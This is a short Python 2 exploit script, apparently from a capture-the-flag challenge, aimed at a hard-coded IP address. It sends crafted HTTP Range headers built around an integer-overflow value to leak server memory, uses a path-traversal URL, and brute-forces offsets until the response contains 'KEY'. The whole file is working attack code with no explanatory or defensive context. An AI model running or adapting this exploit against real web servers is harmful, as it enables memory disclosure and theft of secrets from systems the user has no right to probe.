#!/usr/bin/env python2
import sys
import requests


headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 99.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135",
}

url = 'http://54.223.177.152/upload /../pwnhub/index.html'
file_len = len(requests.get(url, headers=headers).content)
print(file_len)
if len(sys.argv) == 2:
    offset = int(sys.argv[1])
    n = file_len + offset
    headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
    print(headers['Range'])
    r = requests.get(url, headers=headers)
    print(r.text)
    if 'KEY' in r.text:
        print('Success')
else:
    for offset in range(file_len - 20, file_len + 20):
        print("offset : %s" % offset)
        n = file_len + offset
        headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
        r = requests.get(url, headers=headers)
        # print(r.text)
        if 'KEY' in r.text:
            print(r.text)
            print('Success')
